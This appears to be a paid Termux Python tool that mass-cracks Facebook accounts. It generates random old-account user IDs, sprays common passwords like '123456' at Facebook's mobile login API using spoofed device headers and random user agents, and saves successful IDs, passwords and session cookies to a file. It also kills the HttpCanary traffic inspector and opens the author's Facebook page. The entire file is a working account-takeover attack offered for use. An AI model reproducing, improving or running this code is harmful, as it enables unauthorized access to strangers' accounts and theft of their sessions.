# ===================================================================
# DECODE BY : ADNAN RAJPOOT
# FACEBOOK : PRINCE.RAJPOOT.0077
# GITHUB : +923306346604
# ===================================================================


import os
import sys
import time
import re
import random
import uuid
import json
import subprocess
import pycurl
from io import BytesIO
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from random import choice as race
from string import digits, ascii_letters
import urllib.parse
import base64
import ctypes

# ===================================================================
# Initial Setup & Welcome
# ===================================================================

print('\x1b[1;91m[\x1b[1;97m-\x1b[1;91m] \x1b[1;92m WELCOME. . . .')
os.system('xdg-open https://www.facebook.com/PRINCE.RAJPOOT.0077')
time.sleep(2)

# ===================================================================
# Color Definitions and UI Strings
# ===================================================================

A = '\x1b[1;97m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
F = '\x1b[38;5;40m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
A1 = '\x1b[38;5;152m'
A2 = '\x1b[38;5;153m'
A3 = '\x1b[38;5;154m'
A4 = '\x1b[38;5;155m'
A6 = '\x1b[38;5;156m'
A7 = '\x1b[38;5;157m'
M = '\x1b[38;5;205m'

s = f"{A4}|{G}-{A}[{G4}1{A}]{G3}"
b = f"{A4}|{G}-{A}[{G4}2{A}]{G4}"
c = f"{A4}|{G}-{A}[{G4}3{A}]{G2}"
d = f"{A4}|{G}-{A}[{G4}0{A}]{G}"
e = f"{A4}|{G}-{A}[{G4}4{A}]{G}"
f = f"{A4}|{G}-{A}[{G4}5{A}]{G}"
g = f"{A4}|{G}-{A}[{G4}6{A}]{G}"
inp = f"{A4}|{G}-{A2}({A1}*{A2}) {G3}"
lop = f"{A4}|{G}--"


# ===================================================================

import random

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a;]',
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]'
        ]

    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(['SM-G900F', 'SM-G920F', 'SM-T535', 'SM-A217F', 'Infinix-X682B'])
        resolution = random.choice(['{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'])
        chrome_version = f"{random.randint(100, 150)}.0.{random.randint(4000, 4999)}.{random.randint(10, 99)}"
        return (
            f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
            f"Mobile Safari/537.36 [{resolution}]"
        )

    def _generate_facebook_user_agent(self):
        fb_version = random.choice(['143.0.0.19.100', '398.0.0.24.97', '408.0.0.16.93'])
        build_version = random.choice(['282124661', '144693238', '394532630'])
        lang = random.choice(['en_US', 'en_GB', 'en_PK', 'hi_IN'])
        carrier = random.choice(['Zong', 'Jazz', 'Telenor', 'Airtel', 'Jio'])
        app = random.choice(['com.facebook.katana', 'com.facebook.orca', 'com.facebook.mlite'])
        brand = random.choice(['Xiaomi', 'Infinix', 'Samsung', 'Realme', 'Vivo'])
        model = random.choice(['X5510', 'X601', 'Galaxy S10', 'Redmi Note 12', 'V2027', 'CPH2341'])
        resolution = random.choice(['{density=2.0,width=720,height=1520}', '{density=2.75,width=1080,height=2340}'])
        android_version = random.randint(7, 13)
        return (
            f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{build_version};FBDM/{resolution};"
            f"FBLC/{lang};FBCR/{carrier};FBMF/{brand};FBDV/{model};"
            f"FBSV/{android_version};FBPN/{app};FBOP/1;FBCA/arm64-v8a;]"
        )

    def _generate_facebook_orca_user_agent(self):
        ua = self._generate_facebook_user_agent()
        return ua.replace('FB4A', 'Orca-Android').replace('katana', 'orca')

    def _generate_facebook_katana_user_agent(self):
        return self._generate_facebook_user_agent()

    def _generate_dalvik_user_agent(self):
        dalvik_version = f"{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        android_version = random.randint(4, 13)
        device = random.choice(['SM-G920F', 'SM-T535', 'Infinix-X6812B', 'Samsung Galaxy S6'])
        return f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device})"

    def _generate_iphone_user_agent(self):
        ios_version = random.randint(9, 17)
        device = random.choice(['iPhone 6', 'iPhone 7', 'iPhone 8', 'iPhone XR', 'iPhone 11'])
        resolution = random.choice(['{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}', '{density=3.5,width=1242,height=2688}'])
        safari_version = f"{random.randint(14, 16)}.0"
        return (
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version}_0 like Mac OS X) "
            f"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{safari_version} "
            f"Mobile/15E148 Safari/605.1.15 [{resolution}]"
        )

    def _generate_windows_user_agent(self):
        rr = random.randint
        aZ = random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        rx = rr(1, 999)
        chrome_major = rr(99, 175)
        chrome_build = f"{chrome_major}.0.{rr(4000, 4999)}.{rr(35, 99)}"
        return (
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            f"(KHTML, like Gecko) Chrome/{chrome_build} Safari/537.36 {aZ}{rx}{aZ}"
        )

    def generate_user_agent(self):
        choice = random.choice([
            'Mozilla', 'Facebook', 'Dalvik', 'iPhone',
            'FacebookOrca', 'FacebookKatana', 'Windows', 'Custom'
        ])
        if choice == 'Mozilla':
            return self._generate_mozilla_user_agent()
        elif choice == 'Facebook':
            return self._generate_facebook_user_agent()
        elif choice == 'Dalvik':
            return self._generate_dalvik_user_agent()
        elif choice == 'iPhone':
            return self._generate_iphone_user_agent()
        elif choice == 'FacebookOrca':
            return self._generate_facebook_orca_user_agent()
        elif choice == 'FacebookKatana':
            return self._generate_facebook_katana_user_agent()
        elif choice == 'Windows':
            return self._generate_windows_user_agent()
        elif choice == 'Custom':
            return random.choice(self.custom_user_agents)


# Instantiate the generator
user_agent_generator = UserAgentGenerator()

# Generate single example
print(user_agent_generator.generate_user_agent())

# Generate 10,000 Windows-based UAs into rug[]
rug = []
for _ in range(10000):
    rug.append(user_agent_generator._generate_windows_user_agent())

# Similar loops for 'ruz' and 'ugen' were present and are omitted for brevity

# ===================================================================
# Device Information Gathering
# ===================================================================

sim_id = ''
try:
    android_version = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
    fblc = 'en_GB'
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')[0].replace('\n', '')
    fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
    fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
    fbdv = model
    fbsv = android_version
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')
    fbdm = ('{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace('\n', '') +
            ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '') + '}')
except Exception:
    fbcr = 'Zong'
    # Fallback values if getprop fails
    # ...

device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm,
}

ua = '[FBAN/FB4A;FBAV/77.0.0.20.66;FBBV/30034644;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Etisalat NG;FBMF/TECNO;FBBD/TECNO;FBPN/com.facebook.katana;FBDV/TECNO-W3;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'


# ===================================================================
# Banners and UI Elements
# ===================================================================
os.system('chmod 700 /data/data/com.termux/files/usr/bin >/dev/null 2>&1')
os.system('pkill -f httcanary >/dev/null 2>&1')

class NebulaColors:
    def __init__(self):
        self.W = '\x1b[97;1m'
        self.R = '\x1b[91;1m'
        self.G = '\x1b[92;1m'
        self.Y = '\x1b[93;1m'
        self.B = '\x1b[94;1m'
        self.P = '\x1b[95;1m'
        self.C = '\x1b[96;1m'
        self.N = '\x1b[0m'

def pro_banner():
    color = NebulaColors()
    return ('''
\x1b[1;91m
________________(-RANA-)__________________

\x1b[1;97mRRRR   AA      J PPPP   OOO   OOO  TTTTTT     
\x1b[1;97mR   R A  A     J P   P O   O O   O   TT       
\x1b[1;92mRRRR  AAAA     J PPPP  O   O O   O   TT       
\x1b[1;92mR R   A  A J   J P     O   O O   O   TT       
\x1b[1;92mR  RR A  A  JJJ  P      OOO   OOO    TT  
\x1b[1;97m     
________________(-BRAND-)_________________
\x1b[1;95m╔══════════════════════════════════════════════╗
\x1b[1;95m║\x1b[1;97m                ✦  𝗧𝗢𝗢𝗟 I𝗡𝗙𝗢 𝗣𝗔𝗡𝗘𝗟  ✦                  \x1b[1;95m          
\x1b[1;95m╚══════════════════════════════════════════════╝
\x1b[1;96m   ➤ \x1b[1;97mCreator        : \x1b[1;96mADNAN RAJPOOT
\x1b[1;96m   ➤ \x1b[1;97mOperated By    : \x1b[1;92mPRINCE RAJPOOT 
\x1b[1;96m   ➤ \x1b[1;97mTool Access    : \x1b[1;93mPAID
\x1b[1;96m   ➤ \x1b[1;97mFacebook       : \x1b[1;91mprince.rajpoot.0077
\x1b[1;96m   ➤ \x1b[1;97mWhatsApp       : \x1b[1;99m+923306346604
\x1b[1;96m   ➤ \x1b[1;97mCurrent Version: \x1b[1;95m3.0.3
\x1b[1;92m──────────────────────────────────────────────────''')

def linex():
    color = NebulaColors()
    print(f'  {color.P}╔═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╗')
    print(f'  {color.P}║    {color.Y}★ PREMIUM TOOL INTERFACE ★    {color.P}║')
    print(f'  {color.P}╚═━─━━━━━━━━━━━━━━━━━━━━━━━━━━━━─━═╝{color.N}')


# ===================================================================
# Authentication / Key Check
# ===================================================================



# ===================================================================
# Main Cracker Class
# ===================================================================

loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

class RAJPOOTCracker:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.color = NebulaColors()
        self.user_agents = self.load_user_agents()

    def load_user_agents(self):
        try:
            # The original code attempts to load UAs from a GitHub raw link.
            # As a fallback, we'll just use the generator.
            # response = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt')
            # return response.text.splitlines()
            return [user_agent_generator.generate_user_agent() for _ in range(100)]
        except Exception:
            return []

    def old_menu(self):
        clear()
        print(f'{self.color.P}╔═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╗')
        print(f'{self.color.P}║         {self.color.Y}★ OLD ACCOUNT CRACKER ★         {self.color.P}║')
        print(f'{self.color.P}╠═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╣')
        print(f'{self.color.P}║ {self.color.C}[1] {self.color.G}CRACK 2009 ACCOUNTS                 {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[2] {self.color.G}CRACK 2009-2013 ACCOUNTS            {self.color.P}║')
        print(f'{self.color.P}║ {self.color.C}[0] {self.color.R}⇦ BACK TO MAIN MENU                 {self.color.P}║')
        print(f'{self.color.P}╚═━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═╝')

        choice = input(f'  {self.color.C}\x1b[1;92m ➤ Choose: {self.color.W}').strip()
        if choice in ('1', '01'):
            self.execute_breach('100000')
        elif choice in ('2', '02'):
            self.quantum_breach_menu()
        elif choice in ('0', '00'):
            return
        else:
            print(f'\n  {self.color.R}⚠ Invalid choice!')
            time.sleep(2)
            self.old_menu()

    def quantum_breach_menu(self):
        clear()
        series_map = {'1': '100000', '2': '100001', '3': '100002', '4': '100003', '5': '100004'}
        print(f'  {self.color.W}\x1b[1;92m ➤ Select Series:')
        for num, prefix in series_map.items():
            print(f'  {self.color.W}[{self.color.G}{num}{self.color.W}] {self.color.C}{prefix}')

        linex()
        choice = input(f'  {self.color.C}\x1b[1;92m ➤ Choose: {self.color.W}').strip()
        selected_prefix = series_map.get(choice)

        if not selected_prefix:
            print(f'  {self.color.R}⚠ Invalid Series!')
            time.sleep(2)
            self.quantum_breach_menu()
            return

        self.execute_breach(selected_prefix)

    def execute_breach(self, prefix):
        try:
            clear()
            limit = int(input(f'  {self.color.G}\x1b[1;92m ➤ Enter Limit: {self.color.W}'))
        except ValueError:
            print(f'  {self.color.R}⚠ Invalid Number!')
            time.sleep(2)
            self.old_menu()
            return

        targets = [prefix + ''.join(random.choices(digits, k=9)) for _ in range(limit)]
        passlist = ['123456789', '123456', '12345678', '1234567', '1234567890']

        with tred(max_workers=30) as executor:
            clear()
            print(f'  {self.color.W}\x1b[1;92m   ➤ Cracking {self.color.Y}{prefix} ')
            print(f'  {self.color.W}\x1b[1;93m   ➤ Targets: {self.color.G}{len(targets)}')
            linex()

            for target in targets:
                executor.submit(self.breach_target, target, passlist)

        self.display_results()

    def breach_target(self, target, passlist):
        self.loop += 1
        sys.stdout.write(f'\r  {self.color.W}[RAJPOOT] {self.loop}|{self.color.R}{len(self.oks)}|{self.color.G}{len(self.cps)}{self.color.W}')
        sys.stdout.flush()

        for password in passlist:
            if self.try_breach(target, password):
                return

    def try_breach(self, uid, password):
        try:
            ua = random.choice(self.user_agents)

            headers = {
                'User-Agent': ua,
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123Dior23437a4a32',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-session-id': f"nid={''.join(random.choices(ascii_letters, k=8))};pid=Main",
                'x-fb-device-group': '5120',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': str(uuid.uuid4()),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com'
            }

            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'register_api',
                'email': uid,
                'password': password,
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_PK',
                'client_country_code': 'PK',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_analytics_tags': '["GDPR","GLOBAL"]',
                'fb_api_platform': 'ANDROID',
                'fb_api_session_id': str(uuid.uuid4()),
                'fb_api_client_time': str(int(time.time())),
                'device_country': 'pk',
                'logging_id': ''.join(random.choices('0123456789abcdef', k=32)),
                'jazoest': '2' + str(random.randint(10, 99)),
                'machine_id': ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyz', k=24))
            }

            encoded_payload = urllib.parse.urlencode(payload)

            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-api.facebook.com/auth/login')
            c.setopt(c.POST, 1)
            c.setopt(c.POSTFIELDS, encoded_payload)
            c.setopt(c.WRITEDATA, buffer)
            c.setopt(c.TIMEOUT, 10)

            header_list = [f"{key}: {value}" for key, value in headers.items()]
            c.setopt(c.HTTPHEADER, header_list)

            c.perform()
            response_body = buffer.getvalue().decode('utf-8')
            response = json.loads(response_body)

            c.close()
            buffer.close()

            if 'session_key' in response:
                self.handle_success(uid, password, response)
                return True
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                self.handle_partial(uid, password)
                return True

        except Exception as e:
            # Silently ignore errors to continue the loop
            pass

        return False

    def handle_success(self, uid, password, response):
        coki = ';'.join([f"{c['name']}={c['value']}" for c in response.get('session_cookies', [])])
        print(f'\r  {self.color.G}\x1b[1;96m   ➤RAJPOOT.OK {self.color.W}{uid}|{self.color.G}{password}{self.color.W}')
        with open('/sdcard/RAJPOOT-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}|{coki}\n')
        self.oks.append(uid)

    def handle_partial(self, uid, password):
        print(f'\r  {self.color.Y}\x1b[1;96m   ➤RAJPOOT.OK {self.color.G}{uid}{self.color.Y}•\x1b[1;90m{password}{self.color.W}')
        with open('/sdcard/RAJPOOT-OLD.txt', 'a') as f:
            f.write(f'{uid}|{password}\n')
        self.cps.append(uid)

    def display_results(self):
        clear()
        print(f'  {self.color.G}\x1b[1;96m   ➤ CRACKING COMPLETE')
        linex()
        print(f'  {self.color.W}CP: {self.color.Y}{len(self.oks)}')
        print(f'  {self.color.W}OK: {self.color.G}{len(self.cps)}')
        linex()
        input(f'  {self.color.C}Press ENTER to continue {self.color.W}')
        self.old_menu()

# ===================================================================
# Entry Point
# ===================================================================

def clear():
    os.system('clear')
    print(pro_banner())

if __name__ == '__main__':
    try:
        cracker = RAJPOOTCracker()
        cracker.old_menu()
    except KeyboardInterrupt:
        print('\n\x1b[91;1m   ➤ Stopped\x1b[97;1m')
        sys.exit()
    except Exception as e:
        print(f'\n\x1b[91;1m   ➤ Error: {str(e)}\x1b[97;1m')

        sys.exit()
